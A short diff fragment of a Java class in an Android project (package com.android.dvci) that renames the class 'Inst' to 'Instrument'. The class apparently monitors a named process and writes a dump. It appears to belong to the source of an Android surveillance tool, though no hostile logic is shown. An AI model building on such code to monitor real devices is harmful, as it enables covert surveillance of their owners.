@@ -20,7 +20,7 @@ import com.android.dvci.file.AutoFile;
 
 import com.android.mm.M;
 
-public class Inst {
+public class Instrument {
 	private static final String TAG = "Instrument";
 	private static final int MAX_KILLED = 3;
 	private String proc;
@@ -31,7 +31,7 @@ public class Inst {
 	private Thread monitor;
 	private int killed = 0;
 
-	public Inst(String process, String dump) {
+	public Instrument(String process, String dump) {
 		final File filesPath = Status.getAppContext().getFilesDir();
 
 		proc = process;
